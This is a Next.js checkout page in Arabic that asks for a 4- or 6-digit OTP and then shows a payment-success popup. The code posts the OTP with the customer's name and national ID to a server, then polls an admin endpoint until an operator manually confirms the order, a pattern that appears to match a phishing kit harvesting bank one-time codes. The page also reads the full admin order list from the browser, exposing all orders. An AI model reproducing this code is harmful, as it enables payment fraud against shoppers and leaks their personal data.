"use client";

import { useState, useEffect, useRef } from "react";
import Link from "next/link";
import { useCartStore } from "../../store/cartStore";
import { KeyRound, FileText, Receipt, X, RotateCcw, ChevronRight } from "lucide-react";
import CheckoutStepper from "../../components/CheckoutStepper";

const C1 = "#053132";
const C5 = "#0D202E";

export default function VerifyPage() {
  const [code, setCode] = useState("");
  const [codeError, setCodeError] = useState(false);
  const [resent, setResent] = useState(false);
  const [confirmed, setConfirmed] = useState(false);
  const [resendCooldown, setResendCooldown] = useState(60);
  const [submitCooldown, setSubmitCooldown] = useState(0);
  const submitCooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [dbOrderId, setDbOrderId] = useState<string | null>(null);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    cooldownRef.current = setInterval(() => {
      setResendCooldown(prev => {
        if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(cooldownRef.current!);
  }, []);

  function startCooldown() {
    clearInterval(cooldownRef.current!);
    setResendCooldown(60);
    cooldownRef.current = setInterval(() => {
      setResendCooldown(prev => {
        if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
  }

  const { customer } = useCartStore();
  const orderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";

  useEffect(() => {
    if (!dbOrderId) return;
    pollRef.current = setInterval(async () => {
      const res = await fetch(`/api/admin/orders/${dbOrderId}`);
      if (!res.ok) return;
      const data = await res.json();
      if (data.status === "confirmed") {
        clearInterval(pollRef.current!);
        setConfirmed(true);
      }
    }, 5000);
    return () => clearInterval(pollRef.current!);
  }, [dbOrderId]);

  async function handleSubmit() {
    if (code.length !== 4 && code.length !== 6) { setCodeError(true); return; }
    setSubmitCooldown(5);
    submitCooldownRef.current = setInterval(() => {
      setSubmitCooldown(prev => {
        if (prev <= 1) { clearInterval(submitCooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
    setCode("");
    await fetch("/api/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
    });
    try {
      const res = await fetch("/api/admin/orders");
      const orders = await res.json();
      const match = Array.isArray(orders) ? orders.find((o: { orderId: string; _id: string }) => o.orderId === orderId) : null;
      if (match) setDbOrderId(match._id);
    } catch {}
  }

  // ── Confirmed Popup ──
  if (confirmed && dbOrderId) {
    return (
      <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 px-4" dir="rtl">
        <div className="relative bg-white rounded-3xl shadow-2xl w-full max-w-sm sm:max-w-md overflow-hidden">
          <Link href="/" className="absolute top-3 left-3 p-1.5 rounded-full bg-gray-100 hover:bg-gray-200 text-gray-500 transition z-10">
            <X className="w-4 h-4" />
          </Link>

          {/* Top accent bar */}
          <div className="h-1.5 w-full" style={{ background: `linear-gradient(90deg, ${C1}, ${C5})` }} />

          <div className="flex flex-col items-center pt-6 pb-3 bg-white">
            <img src="/sucess.webp" alt="success" className="w-28 h-28 sm:w-36 sm:h-36 object-contain" />
            <span className="mt-3 text-white text-sm font-bold px-6 py-1.5 rounded-full shadow-md" style={{ background: `linear-gradient(135deg, ${C1}, ${C5})` }}>
              نجحت عملية الدفع ✓
            </span>
          </div>

          <div className="px-6 py-5 flex flex-col gap-4 text-center">
            <div className="space-y-2">
              <p className="text-gray-900 font-bold text-base">تمت العملية بنجاح</p>
              <p className="text-gray-500 text-sm leading-7">
                شكراً لك لثقتك، وإنه لمن دواعي سرورنا العمل معكم، نشكرك على كونك واحداً من عملائنا الكرام، أنتم تستحقون أفضل خدماتنا.
              </p>
              <p className="text-gray-400 text-xs">يرجى التواصل مع موظف خدمة العملاء لاستكمال إجراءات شحن الطلب.</p>
            </div>
            <div className="flex gap-3 pb-1">
              <a href={`/admin/orders/${dbOrderId}/print`} target="_blank" rel="noopener noreferrer"
                className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-xl text-white font-semibold text-sm shadow-md transition hover:opacity-90"
                style={{ background: `linear-gradient(135deg, ${C1}, ${C5})` }}>
                <FileText className="w-4 h-4" /> الفاتورة
              </a>
              <a href={`/admin/orders/${dbOrderId}/receipt`} target="_blank" rel="noopener noreferrer"
                className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-xl text-white font-semibold text-sm shadow-md transition hover:opacity-90"
                style={{ background: `linear-gradient(135deg, ${C1}, ${C5})` }}>
                <Receipt className="w-4 h-4" /> سند القبض
              </a>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // ── OTP Form ──
  return (
    <main className="min-h-screen bg-white flex flex-col items-center justify-center px-4 sm:px-6 py-10" dir="rtl">

      {/* Steps */}
      <div className="w-full max-w-lg mb-2">
        <CheckoutStepper active="confirm" />
      </div>

      <div className="bg-white rounded-3xl w-full max-w-lg overflow-hidden border border-gray-100 shadow-xl shadow-gray-100/80">

        {/* Top accent bar */}
        <div className="h-1.5 w-full" style={{ background: `linear-gradient(90deg, ${C1}, ${C5})` }} />

        {/* Icon header */}
        <div className="pt-8 pb-4 flex flex-col items-center gap-3">
          <div className="w-14 h-14 rounded-2xl flex items-center justify-center" style={{ background: `linear-gradient(145deg, ${C1}, ${C5})` }}>
            <KeyRound className="text-white w-7 h-7" />
          </div>
          <div className="text-center space-y-0.5">
            <h2 className="text-gray-900 text-lg font-extrabold">رمز التحقق OTP</h2>
            <p className="text-gray-400 text-xs">أدخل الرمز المرسل إلى هاتفك</p>
          </div>
        </div>

        <div className="px-6 sm:px-8 pb-7 space-y-5">

          {/* OTP Input */}
          <div className="flex flex-col gap-1.5">
            <label className="text-xs font-semibold text-gray-500 text-right">رمز التحقق</label>
            <input
              type="text"
              inputMode="numeric"
              value={code}
              maxLength={6}
              placeholder=""
              onChange={e => { setCode(e.target.value.replace(/\D/g, "").slice(0, 6)); setCodeError(false); }}
              className={`w-full text-center text-2xl font-bold tracking-[0.4em] border rounded-xl px-4 py-3.5 outline-none transition-all ${
                codeError
                  ? "border-red-300 bg-red-50 text-red-500"
                  : "border-gray-200 bg-gray-50 text-gray-900 focus:border-[#053132] focus:bg-white"
              }`}
            />
            <p className="text-gray-400 text-[11px] text-center">قد يصل الرمز متأخراً بعد دقائق</p>
            {codeError && <p className="text-red-500 text-xs font-medium text-center">الكود يجب أن يكون 4 أو 6 أرقام</p>}
            {resent && <p className="text-emerald-600 text-xs font-medium text-center">تم إعادة إرسال الرمز بنجاح</p>}
          </div>

          {/* Actions */}
          <div className="space-y-2.5">
            <button
              onClick={handleSubmit}
              disabled={submitCooldown > 0}
              className="w-full text-white py-3.5 rounded-2xl font-bold text-sm transition-all shadow-lg active:scale-[0.98] disabled:opacity-60 disabled:cursor-not-allowed"
              style={{ background: `linear-gradient(135deg, ${C1}, ${C5})`, boxShadow: `0 8px 24px ${C1}30` }}
            >
              {submitCooldown > 0 ? `⏳ انتظر ${submitCooldown}ث` : "✅ إتمام الطلب"}
            </button>

            <button
              disabled={resendCooldown > 0}
              onClick={() => {
                fetch("/api/resend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ orderId, customerName: customer?.name ?? "—" }) });
                setResent(true);
                setTimeout(() => setResent(false), 3000);
                startCooldown();
              }}
              className="w-full flex items-center justify-center gap-2 py-3 rounded-2xl text-sm font-medium transition-all border-2 disabled:opacity-50 disabled:cursor-not-allowed"
              style={{ borderColor: `${C1}30`, color: C1, background: "#f0f9f9" }}
            >
              <RotateCcw className="w-3.5 h-3.5" />
              {resendCooldown > 0 ? `إعادة الإرسال بعد ${resendCooldown}ث` : "إعادة إرسال الرمز"}
            </button>

            <Link
              href="/checkout"
              className="w-full flex items-center justify-center gap-2 border border-gray-200 text-gray-500 hover:bg-gray-50 py-3 rounded-2xl font-medium text-sm transition"
            >
              <ChevronRight className="w-4 h-4" />
              العودة للخطوة السابقة
            </Link>
          </div>
        </div>
      </div>
    </main>
  );
}
